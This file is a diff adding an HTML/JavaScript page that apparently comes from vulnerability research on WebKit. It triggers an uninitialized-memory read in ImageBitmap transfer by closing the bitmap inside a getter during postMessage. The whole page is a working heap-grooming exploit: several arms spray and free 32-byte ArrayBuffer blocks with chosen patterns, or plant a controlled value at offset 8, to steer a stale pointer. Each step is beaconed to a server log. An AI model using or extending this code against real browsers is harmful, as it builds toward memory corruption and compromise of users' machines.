@@ -1,0 +1,274 @@
+<!doctype html>
+<meta charset=utf-8>
+<title>caps14 — grooming the 32-byte backing-store element</title>
+<!--
+  docs/93 — the follow-up docs/92 §4 asks for. The element that is read by
+  readTransferredImageBitmap (SerializedScriptValue.cpp:4034) is a
+  std::optional<ImageBitmapBacking>, sizeof 32, in a Vector with size=1 cap=1, i.e. one
+  FastMalloc(32) block built by ImageBitmap::detachBitmaps -> WTF::map -> reserveInitialCapacity(1)
+  AFTER the serialization walk. For a bitmap closed from inside a getter the optional is
+  disengaged, so offsets 0..23 are never written and offset 8 (m_serializedBitmap) holds
+  whatever the block held before: under ASAN the malloc fill 0xbe, in a release build
+  previous heap contents.
+
+  This page grooms that block from page script, inside the same walk, with one variable per arm:
+    arm=presence2   — what the build exposes (measured, never assumed)
+    arm=base        — {k:bitmap, g:getter-closes-it}; no shaping. The docs/92 baseline.
+    arm=spray       — same message plus a third, LAST property whose getter frees `n` blocks of
+                      `cls` bytes filled with pattern byte `pat`, then churns objects to force a
+                      young-gen collection. The freed blocks are the only 32-byte-class free
+                      memory when detachBitmaps() allocates.
+  Query knobs: n (count, default 20000), cls (block bytes, default 32), pat (byte, hex, default 41),
+  ch (churn objects, default 400000).
+  Every arm beacons before it allocates, so a crash leaves the intent in the server log; the
+  verdict is the ASAN fault address, never a beacon.
+-->
+<body>
+<canvas id="c" width="8" height="8"></canvas>
+<script>
+"use strict";
+const Q = new URLSearchParams(location.search);
+const ARM = Q.get('arm') || 'presence2';
+const TMO = +(Q.get('tmo') || 4000);
+const N = +(Q.get('n') || 20000);
+const CLS = +(Q.get('cls') || 32);
+const PAT = parseInt(Q.get('pat') || '41', 16);
+const VAL = parseInt(Q.get('v') || '0', 16) >>> 0;   // mode=lo: the 32-bit value planted at offset 8
+const MODE = Q.get('mode') || 'lo';                  // lo | full
+const CH = +(Q.get('ch') || 400000);
+const DELAY = +(Q.get('delay') || 0);
+const XFER = Q.get('xfer') !== '0';       // xfer=0: post the bitmap as a VALUE (no transfer list) — diag arm
+const LATE = Q.get('late') === '1';       // late=1: run the groom from a setTimeout(0) after postMessage
+const QUIET = Q.get('quiet') === '1';     // quiet=1: no beacons inside the getter (they free 32-byte host strings)
+let FCOUNT = 0;
+const FREG = (typeof FinalizationRegistry === 'function') ? new FinalizationRegistry(() => { FCOUNT++; }) : null;
+const S = [];
+function ev(m) { S.push(m); new Image().src = '/ev?m=' + encodeURIComponent(m); }
+function fin(extra) { ev('done&arm=' + ARM + (extra ? '&' + extra : '')); }
+function err(m) { ev('err&arm=' + ARM + '&e=' + encodeURIComponent(String(m).slice(0, 160))); }
+window.onerror = (m) => err('onerror:' + m);
+window.onunhandledrejection = (e) => err('unhandled:' + (e.reason && e.reason.name) + ':' + (e.reason && e.reason.message));
+
+const cv = document.getElementById('c');
+const cx = cv.getContext('2d', { willReadFrequently: true });
+cx.fillStyle = '#ff0000'; cx.fillRect(0, 0, 8, 8);
+
+function readPix(bmp) {
+    try {
+        const w = bmp.width, h = bmp.height;
+        if (!w || !h) return 'nowh:' + w + 'x' + h;
+        const c2 = document.createElement('canvas'); c2.width = w; c2.height = h;
+        const x2 = c2.getContext('2d', { willReadFrequently: true });
+        x2.drawImage(bmp, 0, 0);
+        const d = x2.getImageData(0, 0, 1, 1).data;
+        return d[0] + ',' + d[1] + ',' + d[2] + ',' + d[3];
+    } catch (e) { return 'throw:' + e.name; }
+}
+function desc(v) {
+    if (v === null) return 'null';
+    if (v === undefined) return 'undef';
+    const t = typeof v;
+    if (t !== 'object') return t + ':' + String(v).slice(0, 20);
+    return (v.constructor && v.constructor.name) + ':w' + v.width + 'h' + v.height;
+}
+function withTimeout(p, ms) {
+    return Promise.race([p, new Promise(r => setTimeout(() => r('__TMO__'), ms))]);
+}
+function onePortMsg(value, transfer) {
+    return new Promise((resolve) => {
+        const ch = new MessageChannel();
+        let settled = false;
+        const done = (o) => { if (!settled) { settled = true; resolve(o); } };
+        ch.port1.onmessage = (e) => done({ ok: 1, data: e.data, tag: 'msg' });
+        ch.port1.onmessageerror = (e) => done({ ok: 0, tag: 'messageerror' });
+        let posted = 0, name = '', message = '';
+        try { ch.port2.postMessage(value, transfer || []); posted = 1; }
+        catch (e) { name = e.name; message = String(e.message).slice(0, 80); }
+        if (!posted) { done({ ok: 0, tag: 'threw', name, message }); return; }
+        setTimeout(() => done({ ok: 0, tag: 'timeout' }), TMO);
+    });
+}
+
+// The groom. Allocates `n` blocks of `cls` bytes (ArrayBuffer data goes through
+// Gigacage::tryMalloc -> FastMalloc -> the system/ASAN malloc, USE_SYSTEM_MALLOC=ON makes
+// GIGACAGE_ENABLED 0), fills every byte with `pat`, drops them, then churns JS objects so a
+// young collection frees them. max_free_fill_size=0 (run_nq.sh) keeps their bytes.
+let GROOM_WR = null;
+function shape(u, mode, pat, val) {
+    if (mode === 'full') { u.fill(pat); return; }
+    u.fill(0);
+    u[8] = val & 0xff; u[9] = (val >>> 8) & 0xff; u[10] = (val >>> 16) & 0xff; u[11] = (val >>> 24) & 0xff;
+}
+function groom(n, cls, pat, ch, mode, val) {
+    const keep = new Array(n);
+    for (let i = 0; i < n; i++) {
+        const u = new Uint8Array(cls);
+        shape(u, mode, pat, val);
+        if (FREG && (i & 63) === 0) FREG.register(u.buffer, i);
+        keep[i] = u;
+    }
+    GROOM_WR = new WeakRef(keep[(n >> 1)] ? keep[(n >> 1)].buffer : new ArrayBuffer(8));
+    for (let i = 0; i < n; i++) keep[i] = null;
+    let junk = [];
+    for (let i = 0; i < ch; i++) junk.push({ a: i });
+    junk = null;
+    return n;
+}
+function witness() {
+    let r = 'na';
+    try { r = GROOM_WR ? (GROOM_WR.deref() === undefined ? 'collected' : 'alive') : 'none'; } catch (e) { r = 'throw'; }
+    return r;
+}
+
+async function main() {
+    ev('cap&arm=' + ARM + '&ua=' + encodeURIComponent((navigator.userAgent || '').slice(0, 40)));
+    if (ARM === 'presence2') {
+        const p = ArrayBuffer.prototype;
+        ev('presence2&cib=' + typeof createImageBitmap + '&stc=' + typeof structuredClone +
+            '&ib=' + typeof ImageBitmap + '&mc=' + typeof MessageChannel +
+            '&acc=' + typeof ArrayBuffer + '&tr=' + typeof p.transfer + '&rs=' + typeof p.resize +
+            '&fr=' + typeof FinalizationRegistry + '&wr=' + typeof WeakRef +
+            '&sab=' + typeof SharedArrayBuffer + '&oc=' + typeof OffscreenCanvas);
+        // does the class even exist? one 32-byte block, freed by the same path the arm uses
+        const b = new ArrayBuffer(32); new Uint8Array(b).fill(0x41);
+        let d = 'ok';
+        try { const c = b.transfer(0); d = 'transferred:bl=' + b.byteLength; } catch (e) { d = 'throw:' + e.name; }
+        ev('cls32&abl=' + 32 + '&transfer=' + encodeURIComponent(d) + '&detached=' + (b.byteLength === 0 ? 1 : 0));
+        return fin();
+    }
+
+    if (ARM === 'gctest') {
+        // Does an allocation churn in a plain task collect young ArrayBuffers on this build?
+        // Blocks are shaped exactly like the groom's, so a "collected" here is the precondition
+        // the spray arm needs; it posts nothing and cannot crash.
+        const blocks = new Array(N);
+        let sentinel = null;
+        for (let i = 0; i < N; i++) {
+            const u = new Uint8Array(CLS);
+            shape(u, MODE, PAT, VAL);
+            if (FREG && (i & 63) === 0) FREG.register(u.buffer, i);
+            blocks[i] = u;
+        }
+        sentinel = new WeakRef(blocks[N >> 1].buffer);
+        for (let i = 0; i < N; i++) blocks[i] = null;
+        let iters = 0;
+        const t0 = performance.now();
+        let junk = [];
+        while (sentinel.deref() !== undefined && iters < CH) {
+            junk.push({ a: iters });
+            if (++iters % 50000 === 0) junk = [];
+        }
+        const ms = Math.round(performance.now() - t0);
+        // let the finalization callbacks run so FCOUNT is meaningful
+        await new Promise(r => setTimeout(r, 50));
+        ev('gcres&n=' + N + '&iters=' + iters + '&wr=' + (sentinel.deref() === undefined ? 'collected' : 'alive') +
+            '&fcount=' + FCOUNT + '&ms=' + ms + '&cls=' + CLS + '&mode=' + MODE);
+        return fin();
+    }
+
+    if (ARM === 'clone') {
+        // The slot is the LAST 32-byte FastMalloc block freed inside the walk. structuredClone()
+        // builds a Vector<uint8_t> whose capacity grows 16 -> 25 -> 38, so the 25-byte block (class
+        // 32) is freed mid-walk and its bytes are the first 25 of the stream:
+        //   [0..3] version=13  [4] StringTag  [5..8] length|flag (LE)  [9..] characters
+        // Element offset 8 therefore reads stream bytes 8..15 = [length MSB][chars 0..3 as 2-byte
+        // units for a 16-bit string]. A 16-bit string 'A','B',0,0,... makes that
+        // 0x00000000_42004100, a low canonical address ASAN can name.
+        const b = await createImageBitmap(cv);
+        const hex = Q.get('s') || '0041004200000000000000000000' + '0100';
+        let ss = '';
+        for (let i = 0; i + 4 <= hex.length; i += 4) ss += String.fromCharCode(parseInt(hex.substr(i, 4), 16));
+        ev('clone&units=' + ss.length + '&hex=' + hex + '&eight=' + (/[^\u0000-\u00ff]/.test(ss) ? 0 : 1));
+        const g = { get z() { b.close(); const o = structuredClone(ss); return o.length; } };
+        const msg = { pad: 'x'.repeat(200), k: b, g: g };
+        const r = await onePortMsg(msg, [b]);
+        ev('xmid&ok=' + r.ok + '&tag=' + r.tag + '&name=' + (r.name || '') + '&m=' + encodeURIComponent(r.message || ''));
+        if (r.ok) ev('rx&d=' + desc(r.data.k) + '&w=' + (r.data.k ? r.data.k.width : -1) + '&h=' + (r.data.k ? r.data.k.height : -1) + '&g=' + r.data.g);
+        return fin();
+    }
+
+    if (ARM === 'spray2') {
+        // The groom is done in a PLAIN task (outside any binding's deferred-GC scope), then the
+        // message is posted. gctest measured that a churn here really collects the dropped blocks
+        // (313/313 finalizers), unlike the same churn inside a getter during postMessage (0/313).
+        const b = await createImageBitmap(cv);
+        const ch = new MessageChannel();
+        const got = new Promise((resolve) => {
+            ch.port1.onmessage = (e) => resolve({ ok: 1, data: e.data });
+            ch.port1.onmessageerror = () => resolve({ ok: 0, tag: 'messageerror' });
+            setTimeout(() => resolve({ ok: 0, tag: 'timeout' }), TMO);
+        });
+        ev('groom&go=1&n=' + N + '&cls=' + CLS + '&mode=' + MODE + '&v=' + VAL.toString(16) + '&ch=' + CH);
+        const blocks = new Array(N);
+        for (let i = 0; i < N; i++) {
+            const u = new Uint8Array(CLS);
+            shape(u, MODE, PAT, VAL);
+            if (FREG && (i & 63) === 0) FREG.register(u.buffer, i);
+            blocks[i] = u;
+        }
+        for (let i = 0; i < N; i++) blocks[i] = null;
+        let iters = 0;
+        const gt0 = performance.now();
+        { let junk = [];
+          while (iters < CH) { junk.push({ a: iters }); if (++iters % 50000 === 0) junk = []; } }
+        const gms = Math.round(performance.now() - gt0);
+        const gAfter = FCOUNT;
+        const g = { get z() { ev('getter&when=afterdump'); b.close(); ev('closed&srcw=' + b.width); return 1; } };
+        const msg = { pad: 'x'.repeat(200), k: b, g: g };
+        let posted = 0, name = '', message = '';
+        try { ch.port2.postMessage(msg, [b]); posted = 1; } catch (e) { name = e.name; message = String(e.message).slice(0, 80); }
+        ev('post&posted=' + posted + '&name=' + name + '&m=' + encodeURIComponent(message) + '&iters=' + iters + '&gms=' + gms + '&fafter=' + gAfter);
+        if (!posted) return fin();
+        const r = await got;
+        ev('xmid&ok=' + r.ok + '&tag=' + r.tag + '&name=' + (r.name || ''));
+        if (r.ok) ev('rx&d=' + desc(r.data.k) + '&w=' + (r.data.k ? r.data.k.width : -1) + '&h=' + (r.data.k ? r.data.k.height : -1) + '&px=' + (r.data.k ? readPix(r.data.k) : 'na'));
+        ev('wr&v=' + witness() + '&fcount=' + FCOUNT);
+        return fin();
+    }
+
+    if (ARM === 'base' || ARM === 'spray') {
+        const b = await createImageBitmap(cv);
+        let when = 'afterdump';
+        const g = { get z() { if (!QUIET) ev('getter&when=' + when); b.close(); if (!QUIET) ev('closed&srcw=' + b.width); return 1; } };
+        let msg;
+        if (ARM === 'spray') {
+            const s = { get z() { ev('spray&go=1&n=' + N + '&cls=' + CLS + '&mode=' + MODE + '&v=' + VAL.toString(16) + '&ch=' + CH); const r = groom(N, CLS, PAT, CH, MODE, VAL); return r; } };
+            // pad first: grows the serialize buffer past the small size classes, so the tail
+            // write after the spray cannot allocate a 32-byte block
+            msg = { pad: 'x'.repeat(200), k: b, g: g, s: s };
+        } else {
+            msg = { pad: 'x'.repeat(200), k: b, g: g };
+        }
+        ev('pre&srcw=' + b.width + '&n=' + N + '&cls=' + CLS + '&mode=' + MODE + '&v=' + VAL.toString(16) +
+            '&xfer=' + (XFER ? 1 : 0) + '&late=' + (LATE ? 1 : 0));
+        if (DELAY) await new Promise(r => setTimeout(r, DELAY));
+        let lateT = 0;
+        if (LATE) {
+            // post first, then groom from a task that races the IPC round trip of the message
+            const p = onePortMsg(msg, XFER ? [b] : []);
+            await new Promise(r => setTimeout(r, +(Q.get('late0') || 0)));
+            const t0 = performance.now();
+            groom(N, CLS, PAT, CH, MODE, VAL);
+            lateT = Math.round(performance.now() - t0);
+            const r = await p;
+            ev('xmid&ok=' + r.ok + '&tag=' + r.tag + '&name=' + (r.name || '') + '&m=' + encodeURIComponent(r.message || '') + '&lateT=' + lateT);
+            if (r.ok) ev('rx&d=' + desc(r.data.k) + '&w=' + (r.data.k ? r.data.k.width : -1) + '&h=' + (r.data.k ? r.data.k.height : -1) + '&px=' + (r.data.k ? readPix(r.data.k) : 'na'));
+            ev('wr&v=' + witness() + '&fcount=' + FCOUNT);
+            return fin();
+        }
+        const r = await onePortMsg(msg, XFER ? [b] : []);
+        ev('xmid&ok=' + r.ok + '&tag=' + r.tag + '&name=' + (r.name || '') + '&m=' + encodeURIComponent(r.message || ''));
+        if (r.ok) {
+            ev('rx&d=' + desc(r.data.k) + '&w=' + (r.data.k ? r.data.k.width : -1) + '&h=' + (r.data.k ? r.data.k.height : -1) +
+                '&px=' + (r.data.k ? readPix(r.data.k) : 'na'));
+        }
+        ev('wr&v=' + witness() + '&fcount=' + FCOUNT);
+        return fin();
+    }
+
+    err('unknown_arm');
+    return fin('badarm=1');
+}
+
+main().catch(e => err('catch:' + (e && e.name) + ':' + (e && e.message)));
+</script>
